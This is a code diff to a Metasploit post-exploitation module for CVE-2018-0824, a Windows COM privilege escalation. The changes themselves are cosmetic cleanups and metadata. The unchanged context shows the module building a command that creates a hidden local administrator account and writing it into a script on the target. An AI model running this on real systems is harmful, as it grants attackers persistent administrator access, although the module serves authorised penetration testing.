@@ -6,7 +6,6 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::File
   include Msf::Post::Windows::Version
-  #  include Msf::Post::Windows::Priv
 
   def initialize(info = {})
     super(
@@ -15,7 +14,7 @@ class MetasploitModule < Msf::Post
         'Name' => 'Windows unmarshal post exploitation',
         'Description' => %q{
           This module exploits a local privilege escalation bug which exists
-          in microsoft COM for windows when it fails to properly handle serialized objects.
+          in Microsoft COM for Windows when it fails to properly handle serialized objects.
         },
         'References' => [
           ['CVE', '2018-0824'],
@@ -39,6 +38,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_config_getenv
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [ARTIFACTS_ON_DISK],
+          'Reliability' => []
         }
       )
     )
@@ -60,8 +64,8 @@ class MetasploitModule < Msf::Post
   def setup
     super
     validate_active_host
-    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
-    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha(rand(6..13))
+    @exploit_name = datastore['EXPLOIT_NAME'] || Rex::Text.rand_text_alpha(6..13)
+    @script_name = datastore['SCRIPT_NAME'] || Rex::Text.rand_text_alpha(6..13)
     @exploit_name = "#{exploit_name}.exe" unless exploit_name.match(/\.exe$/i)
     @script_name = "#{script_name}.sct" unless script_name.match(/\.sct$/i)
     @temp_path = datastore['PATH'] || session.sys.config.getenv('TEMP')
@@ -70,8 +74,8 @@ class MetasploitModule < Msf::Post
   end
 
   def populate_command
-    username = Rex::Text.rand_text_alpha(rand(6..13))
-    password = Rex::Text.rand_text_alpha(rand(6..13))
+    username = Rex::Text.rand_text_alpha(6..13)
+    password = Rex::Text.rand_text_alpha(6..13)
     print_status("username = #{username}, password = #{password}")
     cmd_to_run = 'net user /add ' + username + ' ' + password
     cmd_to_run += '  & net localgroup administrators /add ' + username
@@ -127,11 +131,12 @@ class MetasploitModule < Msf::Post
     script_template_data = ::IO.read(local_script_template_path)
     vprint_status("script_template_data.length =  #{script_template_data.length}")
     full_command = 'cmd.exe /c ' + cmd_to_run
-    full_command = full_command
     script_data = script_template_data.sub!('SCRIPTED_COMMAND', full_command)
+
     if script_data.nil?
       fail_with(Failure::BadConfig, 'Failed to substitute command in script_template')
     end
+
     vprint_status("Writing #{script_data.length} bytes to #{script_path} to target")
     write_file(script_path, script_data)
     vprint_status('Script uploaded successfully')
